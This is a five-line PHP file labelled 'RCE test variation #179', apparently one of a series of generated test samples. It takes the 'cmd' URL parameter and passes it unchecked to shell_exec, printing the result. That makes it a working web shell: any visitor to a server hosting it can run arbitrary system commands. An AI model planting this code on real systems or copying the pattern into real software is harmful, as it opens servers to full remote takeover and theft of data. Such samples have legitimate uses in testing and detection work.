<?php
// RCE test variation #179
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>